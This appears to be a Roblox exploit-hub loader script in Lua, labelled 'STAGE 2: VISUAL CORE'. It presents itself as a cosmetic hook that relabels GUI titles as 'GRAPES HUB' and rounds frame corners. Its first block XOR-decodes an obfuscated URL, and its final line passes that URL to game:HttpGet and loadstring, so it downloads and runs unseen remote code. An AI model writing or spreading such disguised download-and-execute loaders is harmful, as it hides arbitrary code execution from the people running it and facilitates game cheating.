
--[[ STAGE 2: VISUAL CORE ]]
local r7VSSgplYyoARZ4dP="\235\249\251\249\246\015\054\048\205\254\198\015\242\206\195\201\216\207\212\212\192\215\194\208\209\169\212\175\167\235\210\160\160\252\186\184\191\166\177\162\142\137\132\183\177\196\131\155\136\220\153\134\129\144\214\153\152\158\155\100\170\106\144\106\097\188\129\118\125\114\115\076\072\122\073\103\133\139\075\094\076"local XC0qgfNCKhFWtRuQH=236 local wRDwxgy1EodSGQYW2V=135 local vBWR2jae2wMyuAFv=1 local tMny2jb_KEcqyWnd8h8VT=2 local EML3bbJkyGrzn5B=22 local RyxOgKobsErASsBXt9=false local SHGAKhoKCnKafWSl_wjX=bit32 and bit32.bxor if not SHGAKhoKCnKafWSl_wjX then SHGAKhoKCnKafWSl_wjX=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local IqXDwPr5s5v1={}for ggUGXFOTlqSkm=1,#r7VSSgplYyoARZ4dP do local P8MMg41rBFjggj9hcfh=string.byte(r7VSSgplYyoARZ4dP,ggUGXFOTlqSkm)local QssNdlaVOJErxxh=(wRDwxgy1EodSGQYW2V+(ggUGXFOTlqSkm*tMny2jb_KEcqyWnd8h8VT)+EML3bbJkyGrzn5B)%256 if vBWR2jae2wMyuAFv==0 then P8MMg41rBFjggj9hcfh=(P8MMg41rBFjggj9hcfh-QssNdlaVOJErxxh)%256 IqXDwPr5s5v1[ggUGXFOTlqSkm]=string.char(SHGAKhoKCnKafWSl_wjX(P8MMg41rBFjggj9hcfh,XC0qgfNCKhFWtRuQH))else P8MMg41rBFjggj9hcfh=SHGAKhoKCnKafWSl_wjX(P8MMg41rBFjggj9hcfh,XC0qgfNCKhFWtRuQH)IqXDwPr5s5v1[ggUGXFOTlqSkm]=string.char((P8MMg41rBFjggj9hcfh-QssNdlaVOJErxxh)%256)end end local YlNRUSVajp4qVj8wBYOWd=table.concat(IqXDwPr5s5v1)if RyxOgKobsErASsBXt9 then YlNRUSVajp4qVj8wBYOWd=string.reverse(YlNRUSVajp4qVj8wBYOWd)end local KPvp3bDNbDa6vQ6s3gQ7p=YlNRUSVajp4qVj8wBYOWd
local HubName = "GRAPES HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(KPvp3bDNbDa6vQ6s3gQ7p))()
